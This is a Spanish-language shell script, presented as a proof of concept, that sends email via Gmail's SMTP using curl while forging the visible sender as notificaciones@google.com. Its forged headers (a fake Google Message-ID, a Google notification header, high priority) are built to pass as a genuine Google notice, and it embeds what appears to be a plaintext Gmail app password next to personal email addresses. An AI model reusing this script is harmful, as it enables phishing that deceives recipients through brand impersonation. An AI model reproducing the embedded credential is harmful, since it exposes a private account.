#!/bin/sh
##################################################
# Prueba de concepto POC, envio bash shell gmail
# Script en Bash Shell 1.0 usando curl con heredo
# Suplanta email, Spoff en el Form a google.com
# El envelope sender (MAIL FROM en SMTP gmail) siempre será la cuenta real, aparecera la cuenta real de origen,  impresa, por el SMTP de gmail
# (R) hackingyseguridad.com 2026
# @antonio_taboada
################################################

# Cuenta real autenticación SMP

real_sender="antonio.taboada@gmail.com"
gapp="satk lnxi lpti vav"

# Cuenta suplantada que se muestra como remitente (spoofing)  
display_name="notificaciones@google.com <notificaciones@google.com>"
# Display-name , es aqui donde haceoms la simulacion  de otro origen

sub="Asunto del email  "

# Cuenta de destino:
receiver="antonio.taboada@telefonica.net"

body="prueba ed envio,

esto es una prueba de concepto POC - mas informacion en:
https://github.com/hackingyseguridad/email/"

# Enviando correo usando curl con heredoc
# NOTA: --mail-from usa la cuenta real para autenticacion SMTP
#       pero el encabezado "From:" muestra la cuenta falsificada
response=$(curl -v --url 'smtps://smtp.gmail.com:465' --ssl-reqd \
    --mail-from "$real_sender" \
    --mail-rcpt "$receiver" \
    --user "$real_sender:$gapp" \
    -T /dev/stdin 2>&1 <<EOF
From: $display_name
To: $receiver
Subject: $sub
Date: $(date -R)
Message-ID: <$(date +%s%N)@google.com>
X-Google-Notification: 1
X-Priority: 1

$body
EOF
)

if [ $? -eq 0 ]; then
    echo "enviado!"
    echo "Remitente visible: $visible_sender"
    echo "Remitente real (SMTP): $real_sender"
else
    echo "Error!"
    echo "Respuesta: $response"
fi


